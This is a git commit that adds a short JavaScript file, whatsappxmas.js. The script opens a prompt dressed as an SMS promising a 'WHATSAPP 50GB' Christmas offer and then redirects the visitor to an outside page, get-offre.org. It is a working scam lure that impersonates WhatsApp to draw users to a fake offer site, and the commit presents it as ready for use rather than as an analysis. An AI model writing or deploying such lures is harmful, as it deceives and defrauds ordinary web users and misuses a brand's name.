461df0954f19d362709cf92f764497619c898bb3
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-11-26 03:31:49 -0800

    Create whatsappxmas.js

---
+++ whatsappxmas.js
@@ -0,0 +1,6 @@
+
+var password = 'CLAIM WHATSAPP 50GB'
+password=prompt('SMS: Hello, Your Christmas offer is awaiting. Kindly Press Ok to Claim now before 31st December ','CLAIM WHATSAPP 50GB ');
+if (password != 'CLAIM WHATSAPP 50GB ') {
+location.href='https://get-offre.org/x-mas-50gb.html';
+}
